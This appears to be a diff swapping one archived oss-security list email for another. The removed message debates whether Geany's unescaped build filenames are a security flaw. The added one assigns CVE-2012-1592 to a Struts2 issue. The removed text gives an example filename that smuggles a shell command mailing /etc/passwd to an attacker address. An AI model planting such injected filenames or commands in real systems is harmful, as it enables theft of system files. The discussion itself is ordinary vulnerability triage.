@@ -1,45 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/12/13/2
-Message-ID: <50C9B36A.9050801@op5.se>
-Date: Thu, 13 Dec 2012 11:52:26 +0100
-From: Andreas Ericsson <ae@....se>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/28/12
+Message-ID: <4F73260D.40205@redhat.com>
+Date: Wed, 28 Mar 2012 08:54:05 -0600
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: Eitan Adler <lists@...anadler.com>,  "Steven M. Christey" <coley@...us.mitre.org>, Nick Treleaven <nick.treleaven@...nternet.com>,  Colomban Wendling <lists.ban@...besfolles.org>, Enrico Troeger <enrico.troeger@...na.de>,  Matthew Brush <mbrush@...ebrainz.ca>, Frank Lanitz <frank@...nk.uvena.de>, josef@...icpanda.com,  jonathan.underwood@...il.com
-Subject: Re: Geany IDE not escaping filenames during compilation / build - a security issue or not?
+CC: David Jorm <djorm@...hat.com>
+Subject: Re: CVE request: Struts2 xsltResult local code execution flaw
 Content-Type: text/plain; charset=utf-8
 
-On 12/13/2012 06:54 AM, Eitan Adler wrote:
-> On 12 December 2012 11:51, Jan Lieskovsky <jlieskov@...hat.com> wrote:
->> The questions:
->> 1) should Geany escape the filenames?,
+On 03/27/2012 11:29 PM, David Jorm wrote:
+> A local code execution flaw has been identified in Struts2. I cannot find a CVE ID for it anywhere.
 > 
-> Up to the maintainers.
+> Original report: http://seclists.org/bugtraq/2012/Mar/110
+> OSVDB: http://osvdb.org/80547
+> X-Force: http://xforce.iss.net/xforce/xfdb/74319
 > 
->> 2) is this a security issue or not?
-> 
-> Unlikely.  Is there a way a malicious document could cause code
-> execution without user action?
-> 
+> Thanks
 
-Extremely unlikely. The way to get someone to trigger this is to send
-a source-file to a developer who then opens it in geany without realizing
-that the file is named "mail evil@...kdom.com -s teehee < /etc/passwd".
-The "attacked" developer then need to attempt to build it from geany's
-internal "build now" button.
-
-A simpler misdeed of similar charactaristics would be to ship a bogus
-./configure script that people (who are not developers, mind you)
-blindly run and which executes bogus commands on behalf of the logged
-in user.
-
-Since the latter isn't really CVE-worthy, I doubt the former even
-comes close.
+Please use CVE-2012-1592 for this issue.
 
 -- 
-Andreas Ericsson                   andreas.ericsson@....se
-OP5 AB                             www.op5.se
-Tel: +46 8-230225                  Fax: +46 8-230231
-
-Considering the successes of the wars on alcohol, poverty, drugs and
-terror, I think we should give some serious thought to declaring war
-on peace.
+Kurt Seifried Red Hat Security Response Team (SRT)
